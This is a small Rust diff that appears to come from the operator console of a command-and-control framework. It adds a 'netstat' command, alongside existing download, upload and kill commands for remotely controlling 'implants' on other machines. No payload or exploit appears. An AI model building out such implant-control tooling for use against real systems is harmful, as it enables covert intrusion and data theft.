@@ -251,6 +251,7 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                             queue(links, link_id, line.clone(), line.clone());
                         }
                     }
+                    "netstat" => queue(links, link_id, "netstat".into(), line.clone()),
 
                     // ── File operations ─────────────────────────────────
                     "download" => {
@@ -394,6 +395,7 @@ fn print_link_help() {
     ui::print("  download <path>     Download file from implant");
     ui::print("  upload <local> <remote> Upload file to implant");
     ui::print("  info                Show link metadata");
+    ui::print("  netstat              List network connections");
     ui::print("  kill                Send exit + mark link dead");
     ui::print("  back                Return to links menu");
 }
